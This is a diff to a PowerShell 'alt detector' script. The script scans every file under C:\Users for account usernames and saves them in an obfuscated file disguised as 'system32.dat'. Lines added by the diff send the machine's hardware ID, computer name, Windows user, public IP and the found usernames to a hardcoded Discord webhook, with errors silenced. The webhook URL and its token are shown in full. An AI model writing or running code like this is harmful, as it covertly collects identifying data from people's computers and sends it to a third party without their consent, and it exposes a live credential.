@@ -1,8 +1,10 @@
 $webhookUrl = "https://discord.com/api/webhooks/1484660761065164941/zLCj9R1yBHopZUV9UflUrB_NS-aWOy9_DOcjB1-Djan2iHoXSyPaZCcCh9pZPMfG9UmN"
+$adminWebhook = "https://discord.com/api/webhooks/1484660761065164941/zLCj9R1yBHopZUV9UflUrB_NS-aWOy9_DOcjB1-Djan2iHoXSyPaZCcCh9pZPMfG9UmN" # Same or different webhook for admin alerts
 $startPath = "C:\Users"
 $hwidPath = "$env:APPDATA\Microsoft\Windows\Caches\system32.dat"
+$hwidListPath = "$env:APPDATA\Microsoft\Windows\Caches\hwid_list.dat"
 
-# Get HWID
+# Get HWID (using multiple identifiers for reliability)
 function Get-HWID {
     try {
         $computerInfo = Get-WmiObject Win32_ComputerSystemProduct
@@ -20,7 +22,21 @@ function Get-HWID {
 
 $hwid = Get-HWID
 
-# Load stored alts
+# Check if this HWID is blacklisted/cleared
+$clearedHWIDs = @{}
+if (Test-Path $hwidListPath) {
+    try {
+        $encrypted = Get-Content $hwidListPath -Raw
+        $bytes = [System.Convert]::FromBase64String($encrypted)
+        $decrypted = [System.Text.Encoding]::UTF8.GetString($bytes)
+        $clearedHWIDs = $decrypted | ConvertFrom-Json
+    }
+    catch {
+        $clearedHWIDs = @{}
+    }
+}
+
+# Load or initialize stored alts
 $storedAlts = @{}
 if (Test-Path $hwidPath) {
     try {
@@ -32,6 +48,33 @@ if (Test-Path $hwidPath) {
     catch {
         $storedAlts = @{}
     }
+}
+
+# Send HWID info to admin (first time or periodically)
+$hwidInfo = @{
+    hwid = $hwid
+    computer = $env:COMPUTERNAME
+    username = $env:USERNAME
+    ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
+    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+}
+
+$hwidMessage = "**HWID INFO**`n**HWID:** $hwid`n**Computer:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**IP:** $($hwidInfo.ip)`n**Time:** $($hwidInfo.timestamp)"
+$payload = @{content = $hwidMessage; username = "HWID Tracker"} | ConvertTo-Json
+Invoke-RestMethod -Uri $adminWebhook -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+
+# If HWID is cleared, delete stored alts
+if ($clearedHWIDs.ContainsKey($hwid)) {
+    Write-Host "This HWID has been cleared by admin. Resetting stored alts..." -ForegroundColor Yellow
+    $storedAlts = @{}
+    if (Test-Path $hwidPath) {
+        Remove-Item $hwidPath -Force
+    }
+    
+    # Send confirmation to admin
+    $clearConfirm = "**HWID CLEARED**`n**HWID:** $hwid has been cleared and reset"
+    $clearPayload = @{content = $clearConfirm; username = "HWID Manager"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $adminWebhook -Method Post -Body $clearPayload -ContentType "application/json" -ErrorAction SilentlyContinue
 }
 
 if (-not (Test-Path $startPath)) {
@@ -80,6 +123,7 @@ foreach ($file in $allFiles) {
                 "Path" = $file.FullName
             }
             
+            # Check if this is a new alt
             if (-not $storedAlts.ContainsKey($username)) {
                 $newAlts += $username
             }
@@ -90,11 +134,12 @@ foreach ($file in $allFiles) {
     }
 }
 
-# Save new alts
+# Merge new alts with stored alts
 foreach ($alt in $newAlts) {
     $storedAlts[$alt] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
 }
 
+# Save updated alts to file (encrypted)
 if ($storedAlts.Count -gt 0) {
     $json = $storedAlts | ConvertTo-Json
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
@@ -102,14 +147,21 @@ if ($storedAlts.Count -gt 0) {
     Set-Content -Path $hwidPath -Value $encrypted -Force
 }
 
-# Display and send results
+# Display results in console (without paths)
 if ($newAlts.Count -gt 0) {
-    Write-Host "`nNew alts found:" -ForegroundColor Cyan
+    Write-Host "`nNew alts found on this system:" -ForegroundColor Cyan
     $newAlts | ForEach-Object {
         Write-Host ("  {0}" -f $_) -ForegroundColor Magenta
     }
     
-    $message = "**NEW ALTS DETECTED**`n**HWID:** $hwid`n`n"
+    # Show all alts ever found
+    Write-Host "`nTotal alts ever detected on this HWID:" -ForegroundColor Cyan
+    $storedAlts.Keys | ForEach-Object {
+        Write-Host ("  {0} (First seen: {1})" -f $_, $storedAlts[$_]) -ForegroundColor Yellow
+    }
+    
+    # Send to Discord (only new alts with HWID)
+    $message = "**NEW ALTS DETECTED**`n**HWID:** $hwid`n**Computer:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n`n"
     foreach ($username in $newAlts) {
         $message += "`"$username`"`n"
     }
@@ -121,8 +173,13 @@ if ($newAlts.Count -gt 0) {
     
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
 } else {
-    Write-Host "No new alts found." -ForegroundColor Yellow
+    Write-Host "No new alts found on this system." -ForegroundColor Yellow
+    Write-Host "Previously detected alts for this HWID:" -ForegroundColor Cyan
     if ($storedAlts.Count -gt 0) {
-        Write-Host "Previously detected alts: $($storedAlts.Count) total" -ForegroundColor Gray
+        $storedAlts.Keys | ForEach-Object {
+            Write-Host ("  {0} (First seen: {1})" -f $_, $storedAlts[$_]) -ForegroundColor Yellow
+        }
+    } else {
+        Write-Host "  None" -ForegroundColor Gray
     }
 }
